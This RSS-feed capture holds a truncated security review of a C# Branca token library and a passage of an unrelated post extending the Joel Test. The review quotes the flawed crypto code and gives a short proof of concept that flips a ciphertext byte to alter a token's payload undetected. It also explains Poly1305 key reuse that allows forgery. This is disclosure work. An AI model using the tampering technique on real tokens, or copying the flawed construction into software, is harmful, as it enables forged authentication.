    <span>TestBranca</span><span>(</span><span>"875GH234UdXU6PkYq8g7tIM80XapDQOH72bU48YJ7SK1iHiLkrqT8Mly7P59TebOxCyQeqpMJ0a7a"</span><span>,</span> <span>"Hello world!"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Running the above tests gave me:</p>

<div><div><pre><code>FAILED: 
expectedToken: 870S4BYjk7NvyViEjUNsTEmGXbARAX9PamXZg0b3JyeIdGyZkFJhNsOQW6m0K9KnXt3ZUBqDB6hF4
expectedPayload: Hello world!
exception: Invalid message authentication code

FAILED: 
expectedToken: 89i7YCwtsSiYfXvOKlgkCyElnGCOEYG7zLCjUp4MuDIZGbkKJgt79Sts9RdW2Yo4imonXsILmqtNb
expectedPayload: Hello world!
exception: Invalid message authentication code

FAILED: 
expectedToken: 875GH234UdXU6PkYq8g7tIM80XapDQOH72bU48YJ7SK1iHiLkrqT8Mly7P59TebOxCyQeqpMJ0a7a
expectedPayload: Hello world!
exception: Invalid message authentication code
</code></pre></div></div>

<p>I was already off to a good start.</p>

<h4 id="nonce-generation">Nonce generation</h4>
<p>Starting at the top of the file containing the Branca implementation, comes <code>CreateToken()</code>. The first thing is nonce generation:</p>
<div><div><pre><code><span>var</span> <span>nonce</span> <span>=</span> <span>new</span> <span>byte</span><span>[</span><span>24</span><span>];</span>
<span>RandomNumberGenerator</span><span>.</span><span>Create</span><span>().</span><span>GetBytes</span><span>(</span><span>nonce</span><span>);</span>
</code></pre></div></div>

<p>It uses the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator.getbytes?view=netcore-3.1">System.Security.Cryptography.RandomNumberGenerator.GetBytes</a> method, which is intended for cryptographic purposes, so that checks out.</p>

<h4 id="unauthenticated-ciphertext">Unauthenticated ciphertext</h4>

<p>After the nonce is generated, the header is created according to the specification. No problem there. Then comes the encryption:</p>

<div><div><pre><code><span>keyMaterial</span> <span>=</span> <span>new</span> <span>KeyParameter</span><span>(</span><span>key</span><span>);</span>
<span>var</span> <span>parameters</span> <span>=</span> <span>new</span> <span>ParametersWithIV</span><span>(</span><span>keyMaterial</span><span>,</span> <span>nonce</span><span>);</span>

<span>var</span> <span>engine</span> <span>=</span> <span>new</span> <span>XChaChaEngine</span><span>();</span>
<span>engine</span><span>.</span><span>Init</span><span>(</span><span>true</span><span>,</span> <span>parameters</span><span>);</span>
</code></pre></div></div>

<p>I’m not familiar with BouncyCastle, so I checked its source to see what <code>KeyParameter</code> and <code>ParametersWithIV</code> were doing. They were simply wrappers for the parameters.</p>

<p><code>XChaChaEngine()</code> was not from BouncyCastle however, but implemented in IdentityModel:</p>

<div><div><pre><code><span>using</span> <span>Org.BouncyCastle.Crypto.Engines</span><span>;</span>

<span>namespace</span> <span>ScottBrady.IdentityModel.Crypto</span>
<span>{</span>
    <span>public</span> <span>class</span> <span>XChaChaEngine</span> <span>:</span> <span>ChaChaEngine</span>
    <span>{</span>
        <span>public</span> <span>XChaChaEngine</span><span>()</span> <span>:</span> <span>base</span><span>(</span><span>20</span><span>)</span> <span>{</span> <span>}</span>

        <span>public</span> <span>override</span> <span>string</span> <span>AlgorithmName</span> <span>=&gt;</span> <span>"XChaCha20"</span><span>;</span>

        <span>protected</span> <span>override</span> <span>int</span> <span>NonceSize</span> <span>=&gt;</span> <span>24</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>After initializing the <code>XChaChaEngine</code>, the payload is “encrypted and authenticated”:</p>

<div><div><pre><code><span>var</span> <span>plaintextBytes</span> <span>=</span> <span>Encoding</span><span>.</span><span>UTF8</span><span>.</span><span>GetBytes</span><span>(</span><span>payload</span><span>);</span>
<span>var</span> <span>ciphertext</span> <span>=</span> <span>new</span> <span>byte</span><span>[</span><span>plaintextBytes</span><span>.</span><span>Length</span> <span>+</span> <span>16</span><span>];</span>

<span>engine</span><span>.</span><span>ProcessBytes</span><span>(</span><span>plaintextBytes</span><span>,</span> <span>0</span><span>,</span> <span>plaintextBytes</span><span>.</span><span>Length</span><span>,</span> <span>ciphertext</span><span>,</span> <span>0</span><span>);</span>

<span>var</span> <span>poly</span> <span>=</span> <span>new</span> <span>Poly1305</span><span>();</span>
<span>poly</span><span>.</span><span>Init</span><span>(</span><span>keyMaterial</span><span>);</span>
<span>poly</span><span>.</span><span>BlockUpdate</span><span>(</span><span>header</span><span>,</span> <span>0</span><span>,</span> <span>header</span><span>.</span><span>Length</span><span>);</span>
<span>poly</span><span>.</span><span>DoFinal</span><span>(</span><span>ciphertext</span><span>,</span> <span>plaintextBytes</span><span>.</span><span>Length</span><span>);</span>
</code></pre></div></div>

<p>This is <strong>not a XChaCha20-Poly1305 construction</strong>. There is no padding of the AAD nor the ciphertext during authentication. Neither is there any authentication of their length. All this is specified in the <a href="https://github.com/bikeshedders/xchacha-rfc">draft RFC</a> and the <a href="https://tools.ietf.org/html/rfc8439">RFC for ChaCha20-Poly1305</a>. Actually, this does not even authenticate the ciphertext since <code>DoFinal()</code> writes the current tag into <code>ciphertext</code>. The <strong>ciphertext can be modified without invalidating the token</strong>.</p>

<div><div><pre><code><span>var</span> <span>handler</span> <span>=</span> <span>new</span> <span>BrancaTokenHandler</span><span>();</span>
<span>var</span> <span>key</span> <span>=</span> <span>Encoding</span><span>.</span><span>UTF8</span><span>.</span><span>GetBytes</span><span>(</span><span>"supersecretkeyyoushouldnotcommit"</span><span>);</span>
<span>var</span> <span>actualToken</span> <span>=</span> <span>handler</span><span>.</span><span>CreateToken</span><span>(</span><span>"Test"</span><span>,</span> <span>key</span><span>);</span>
<span>var</span> <span>decoded</span> <span>=</span> <span>Base62</span><span>.</span><span>Decode</span><span>(</span><span>actualToken</span><span>);</span>
<span>decoded</span><span>[</span><span>decoded</span><span>.</span><span>Length</span> <span>-</span> <span>17</span><span>]</span> <span>^=</span> <span>1</span><span>;</span> <span>// Last byte before the Poly1305 tag</span>
<span>Console</span><span>.</span><span>WriteLine</span><span>(</span><span>"{0}"</span><span>,</span> <span>handler</span><span>.</span><span>DecryptToken</span><span>(</span><span>Base62</span><span>.</span><span>Encode</span><span>(</span><span>decoded</span><span>),</span> <span>key</span><span>).</span><span>Payload</span><span>);</span>
</code></pre></div></div>

<p>Running this will return <code>Tesu</code> instead of <code>Test</code>. Thereby, <strong>IdentityModel allows attackers to arbitrarily modify the payload of a Branca token</strong>.</p>

<p>After searching BouncyCastle, I found no XChaCha20 implementation but a ChaCha20-Poly1305, which had the following fields:</p>

<div><div><pre><code><span>private</span> <span>readonly</span> <span>ChaCha7539Engine</span> <span>mChacha20</span><span>;</span>
<span>private</span> <span>readonly</span> <span>IMac</span> <span>mPoly1305</span><span>;</span>
</code></pre></div></div>

<p>As you might have noticed, <code>ChaCha7539Engine</code> is not the same engine that is implemented by <code>XChaChaEngine</code> in IdentityModel. Turns out, IdentityModel uses the ChaCha20 variant with a 64-bit nonce, instead of the 96-bit nonce required by the IETF version of ChaCha20. Both ChaCha20-Poly1305 and XChaCha20-Poly1305 require the IETF variant of ChaCha20. Taking a look at <code>ChaChaEngine</code> from BouncyCastle, there is no HChaCha20 being used to calculate a subkey, if the nonce length is set to 24 as in <code>XChaChaEngine</code>. Therefore, all we’re left with is the original ChaCha20 from DJB, using an 8-byte nonce, meaning <code>engine.Init(true, parameters)</code> only loads 8 bytes of the 24-byte nonce that has been generated.</p>

<p>The Branca specification makes it <a href="https://github.com/tuupola/branca-spec">pretty clear</a> how to encrypt the payload:</p>
<blockquote>
  <ol>
    <li>Encrypt the user given payload with IETF XChaCha20-Poly1305 AEAD with user-provided secret key. Use the header as the additional data for AEAD.</li>
  </ol>
</blockquote>

<p>It doesn’t have to be made as complicated as the above code from IdentityModel. If one reads the draft RFC, or looks at another implementation, it eventually becomes clear that XChaCha20-Poly1305 is “just” a combination of HChaCha20 and ChaCha20-Poly1305.</p>

<h4 id="forgeable-tokens">Forgeable tokens</h4>
<p>Let’s return to the attempt of authenticating the header and ciphertext. Specifically, this line:</p>


<p><code>keyMaterial</code> is <strong>the same key</strong> that was used to initialize the <code>XChaChaEngine</code>.</p>

<blockquote>
  <p>The sender must not use crypto_onetimeauth to authenticate more than one message under the same key. Authenticators for two messages under the same key should be expected to reveal enough information to allow forgeries of authenticators on other messages.</p>
</blockquote>

<p>(From <a href="https://nacl.cr.yp.to/onetimeauth.html">NaCl</a>)</p>

<p>As NaCls documentation states, any given key used with Poly1305 may <strong>only be used once</strong> otherwise, an attacker could forge future authenticators. This is a problem since Branca might be used in contexts like authenticating API calls, where long-lived API keys are used. <strong>IdentityModel allows attackers to forge API tokens</strong>.</p>

<p>This would not be a problem in IdentityModel, had it at least used ChaCha20-Poly1305 from BouncyCastle to attempt the Branca implementation. ChaCha20-Poly1305 uses the first 32 bytes of the first keystream-block (64 bytes), of the internal ChaCha20 state, as the Poly1305 one-time key. So if a nonce is unique for every time ChaCha20-Poly1305 is used with any given key (which it <strong>MUST</strong>), the Poly1305 key will also be unique.</p>

<p>Of course, IdentityModel should use XChaCha20-Poly1305, not only because that is what the Branca specification defines, but also because it’s not safe to randomly generate nonces for ChaCha20 or ChaCha20-Poly1305 (see <a href="https://godoc.org/golang.org/x/crypto/chacha20poly1305">/x/crypto</a>). This limitation was the motivation behind XChaCha20-Poly1305 (see <a href="https://github.com/bikeshedders/xchacha-rfc/blob/master/draft-irtf-cfrg-xchacha-rfc-03.txt">draft RFC</a>).</p>

<h4 id="constant-time-mac-comparison">Constant-time MAC comparison</h4>
<p>Any decent ChaCha20-Poly1305 or XChaCha20-Poly1305 implementation will compare the Poly1305 MACs in constant-time, to not reveal information via a timing side-channel. This, unfortunately, is not the case for IdentityModel either:</p>

<div><div><pre><code><span>var</span> <span>headerMac</span> <span>=</span> <span>new</span> <span>byte</span><span>[</span><span>16</span><span>];</span>
<span>[..]</span>
<span>if</span> <span>(!</span><span>headerMac</span><span>.</span><span>SequenceEqual</span><span>(</span><span>tag</span><span>))</span> <span>throw</span> <span>new</span> <span>SecurityTokenException</span><span>(</span><span>"Invalid message authentication code"</span><span>);</span>
</code></pre></div></div>

<p>BouncyCastle uses constant-time comparison with ChaCha20-Poly1305 and provides the comparison function as a utility:</p>

<div><div><pre><code><span>if</span> <span>(!</span><span>Arrays</span><span>.</span><span>ConstantTimeAreEqual</span><span>(</span><span>MacSize</span><span>,</span> <span>mMac</span><span>,</span> <span>0</span><span>,</span> <span>mBuf</span><span>,</span> <span>resultLen</span><span>))</span>
<span>{</span>
    <span>throw</span> <span>new</span> <span>InvalidCipherTextException</span><span>(</span><span>"mac check in ChaCha20Poly1305 failed"</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<h3 id="summary">Summary</h3>

<p>I’m a big fan of “rolling your own crypto” and here I’m talking about implementing known algorithms. I do it myself. I even think making it available on GitHub or similar, to ask for feedback, is good (if users are warned that no security can be expected).</p>

<p>However, a problem arises when projects that …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html">https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html</a></em></p>]]>
            </description>
            <link>https://brycx.github.io/2020/08/22/a-look-at-a-branca-implementation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24243750</guid>
            <pubDate>Sat, 22 Aug 2020 12:45:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing better Code (extension to Joel's 12 steps to better Code)]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24243656">thread link</a>) | @gerlacdt
<br/>
August 22, 2020 | https://gerlacdt.github.io/posts/writing-better-software/ | <a href="https://web.archive.org/web/*/https://gerlacdt.github.io/posts/writing-better-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>I</span>n Joel Spolsky’s blog post <a href="https://www.joelonsoftware.com/2000/08/09/the-joel-test-12-steps-to-better-code/" target="_blank" rel="noopener">“The Joel Test: 12 Steps to better
Code”</a>,
he describes a test composed of twelve simple yes-no questions. For a
<strong>yes</strong> you get one point. 10 points are acceptable and 12 are
perfect. If you have less than 10 points, you will get in trouble with
your software – sooner or later.</p>
<p>For a quick self-check, these are the original questions:</p>
<ol>
<li>Do you use source control?</li>
<li>Can you make a build in one step?</li>
<li>Do you make daily builds?</li>
<li>Do you have a bug database?</li>
<li>Do you fix bugs before writing new code?</li>
<li>Do you have an up-to-date schedule?</li>
<li>Do you have a spec?</li>
<li>Do programmers have quiet working conditions?</li>
<li>Do you use the best tools money can buy?</li>
<li>Do you have testers?</li>
<li>Do new candidates write code during their interview?</li>
<li>Do you do hallway usability testing?</li>
</ol>
<p>Although Joel’s Test is still an excellent indicator for good software
development and engineering, 20 years have past and many game changing
technologies have emerged like mobile apps, the public cloud and in
general better tooling is available. The success of
<a href="https://git-scm.com/" target="_blank" rel="noopener">git</a> and <a href="https://github.com/" target="_blank" rel="noopener">github</a> changed
how we develop software. In this article i want to extend Joel’s test
with contemporary questions:</p>
<ol start="13">
<li>Do you enforce a common code styleguide?</li>
<li>Do you write tests?</li>
<li>Do you conduct code reviews?</li>
<li>Do your developers write documentation?</li>
<li>Do you focus on code health?</li>
<li>Do you practice continuous integration?</li>
<li>Do you have a mentoring program?</li>
<li>Is your infrastructure reproducible?</li>
<li>Are you doing your best to keep your engineers?</li>
<li>Do you provide the best technology for your developers?</li>
<li>Do you focus on the four key metrics?</li>
<li>Do you empower your developers?</li>
</ol>
<p>The extended test consists of 24 yes-no questions. As with Joel’s
Test, for a <strong>yes</strong> you get one point. The ranking is:</p>
<ul>
<li>&lt;= 20 points, you must improve</li>
<li>21 points, you are ok</li>
<li>22 points, you are a high-performer</li>
<li>23 points, you are a high-performer</li>
<li>24 points, you are best-in-class</li>
</ul>
<p>Further I want to emphasis that <strong>sustainablity</strong> is my main intention
for the test. Many questions contribute directly or indirectly to a
sustainable and healthy codebase which is crucial for a successful
long-term software project and in general for a successful software
company. <a href="https://youtu.be/zW-i9eVGU_k?t=197" target="_blank" rel="noopener">Titus Winters</a> defines a
sustainable codebase as:</p>
<blockquote>
<p>Your organization’s codebase is sustainable when you are able to
change all of the things that you ought to change, safety, and can do
so for the lifetime of your codebase.</p>
</blockquote>
<h4 id="13-do-you-enforce-a-common-code-styleguide"><a href="#13-do-you-enforce-a-common-code-styleguide"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>13. Do you enforce a common code styleguide?</h4>
<p><strong>Consistency</strong> is one of the most important properties of a codebase.
It bolsters readability and maintainability which are essential for
sustainable code. A consistent codebase is easier to grasp and makes
onboarding new developers faster. New programmers are guided by the
prevailing style and can adapt quickly to it. Consistency is also an
indicator for coder’s discipline, clearly you don’t want to have dead
code, unused imports, wrong indentations, and other intricacies in
your codebase. The desired consistency can be achieved by a code
styleguide.</p>
<p>At best you enforce the rules of the styleguide via tooling like
static code analyzers, linters and autoformatting tools. Often these
tools are integrated into the build or are executed before a
commit. Further there are also manually measures like <a href="#codereview">code
reviews</a> to enforce a common code style.</p>
<p>A consistent code style increases productivity, e.g. linters prevent
sloppy programming errors, autoformatters leave no room for useless
(sometimes religious) discussions about indentation and formatting
rules. All code looks the same. Developer’s taste and ego take a back
seat.</p>
<h4 id="14-do-you-write-tests"><a href="#14-do-you-write-tests"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>14. Do you write tests?</h4>
<p>Writing automatic test is a major trait of a sustainable
codebase. There are many kind of tests but the best known
classification comes with the <a href="https://martinfowler.com/articles/practical-test-pyramid.html" target="_blank" rel="noopener">Test
Pyramid</a>.</p>
<ul>
<li>Unit Tests</li>
<li>Service Tests</li>
<li>User Interface Tests</li>
</ul>
<p>Particularly <strong>unit tests</strong> build the foundation and give developers
confidence to move fast and not to break existing functionality. Unit
testing is a major pillar of a fast feedback loop. This keeps
developers happy and the quality high. In general, tests act as a
safety net, prevent new bugs from being introduced and old bugs from
reoccurrence.</p>
<p>Without automatic tests your codebase will erode and only long-term
developers will be capable to make changes. Onboarding new developers
will take months or will never succeed at all. Over time developer
speed will slow down and finally come to a complete halt. Heavily
relying on manual testing before a release is a clear indicator of
missing automatic tests and extends the release cycle by days or
weeks. High performers deploy on a daily basis which is not possible
with manual testing phases. Therefore manual testing should be reduced
to a minimum or completely avoided.</p>
<p>Establishing a good testing culture is especially important. E.g.</p>
<ul>
<li>no code changes without a corresponding test</li>
<li>no bugfix without a test demonstrating the bug is indeed fixed</li>
<li>unit test should be fast, so developers run them continuously</li>
<li>unit test code coverage should be at a reasonable level like ~70%</li>
</ul>
<p>At Google, they practice the <a href="https://www.oreilly.com/library/view/software-engineering-at/9781492082781/" target="_blank" rel="noopener">Beyonce Rule “If you liked it, you
shoulda put a test on
it!"</a>
This rule inverts responsibility, e.g. if someone breaks a feature and
there was no test, the original author of the broken feature “shoulda
put a test on it!”.</p>
<h4 id="codereview"><a href="#codereview"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>15. Do you conduct code reviews?</h4>
<p>Code reviews are a critical step in your software engineering
process. Not only they prevent entering bugs into your mainline but
they are a major tool for knowledge transfer, learning and mentoring.
The code review process fosters a common understanding between
reviewers and author and offers a platform for discussions about
trade-offs and design decisions. Reviews are not only focused on
correctness but also on readability, performance and other
non-functional properties.</p>
<p>All of that will lead to better solutions. Further reviewers practice
their code reading skill which is as important as code
writing. Besides compiling, linting and running tests, code reviews
form a major step in a developers feedback loop. Code should never be
committed into mainline without a proper code review.</p>
<p>Because code reviews can conjure up heated discussions, reviewers
should comply to some <a href="https://google.github.io/eng-practices/review/reviewer/" target="_blank" rel="noopener">code review
guidelines</a>
in order to guarantee a flawless experience.</p>
<h4 id="16-do-developers-write-documentation"><a href="#16-do-developers-write-documentation"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>16. Do developers write documentation?</h4>
<p>Documentation starts with the code. Code comments or a good
description of a pull request are good examples. Thereby good
documentation focuses on <strong>why</strong> something was done. An extensive
<code>README.md</code> acts as the “front-page” of a project and should contain
its purpose and instructions for developers to set up their local
environment for development, e.g installing prerequisites, building
the project, running the tests.</p>
<p>Additionally a variety of documents with different purposes exist:</p>
<ul>
<li>Design Docs (showing alternative solutions, why was one approach
chosen over the others?)</li>
<li>Architecture Diagrams (System overview, showing coherence between
components)</li>
<li>Operational Playbooks for <a href="https://landing.google.com/sre/workbook/chapters/on-call/" target="_blank" rel="noopener">Software Reliability Engineers
(SREs)</a>
(operational instructions for fighting outages)</li>
</ul>
<p>All these documents should be written by developers, operators or
other technical people. Living, up-to-date documentation makes a
project more understandable and long-term project members are capable
of answering questions why things were done in the past – in the
majority of projects, the top answer is “this is historically grown”.
The only way to get real insights is conducting time consuming
face-to-face interviews. Documentation helps to keep an overview over
an ever-growing project, to facilitate the start for new developers
and to build a searchable knowledge base. Past decisions should be
transparent through good documentation and not hidden in people’s
heads.</p>
<h3 id="17-do-you-focus-on-code-health"><a href="#17-do-you-focus-on-code-health"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>17. Do you focus on code health?</h3>
<p>A healthy codebase is a major criteria for developer happiness. If
your developers working on a shitty codebase, they adapt to the poor
quality or leave. The existing codebase act as a <strong>role model</strong>. For
the purpose of high quality code, it is important to continuously
focus on code health. The best coders are repelled by bad code and
attracted by healthy code. But what is a healthy codebase?</p>
<p>A codebase is healthy when:</p>
<ul>
<li>you have fast builds</li>
<li>you have an easy development setup</li>
<li>you have fast and maintainable tests</li>
<li>you have clean, readable, loosely coupled and consistent code</li>
<li>you can easily debug the system</li>
<li>you continuously tackle technical debt</li>
</ul>
<p>You can find a much more exhaustive explanation of code health in
<a href="https://testing.googleblog.com/2016/08/hackable-projects.html" target="_blank" rel="noopener">Google’s Testing Blog about Code
Health</a>.</p>
<p>Signs of bad code are:</p>
<ul>
<li>complicated developer setup</li>
<li>hard to debug, missing monitoring, noisy garbage logs</li>
<li>long build times</li>
<li>inconsistent code (dead code, unused imports, different formatting
styles, no code styleguide)</li>
<li>large merge conflicts due to long running feature branches, broken mainline</li>
<li>no tests, flaky tests, hard-maintainable tests because of mocking overuse</li>
</ul>
<p>Never trade dirty code or workarounds due to time or release pressure
for code health. You will end up very badly in the long run. Worse
yet, you get in a vicious cycle because bad code slows you down and in
order to fulfil the next release you add more dirty workarounds. So
always prioritize code health, even when it looks counterintuitive at
first sight.</p>
<h3 id="18-do-you-practice-continuous-integration"><a href="#18-do-you-practice-continuous-integration"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 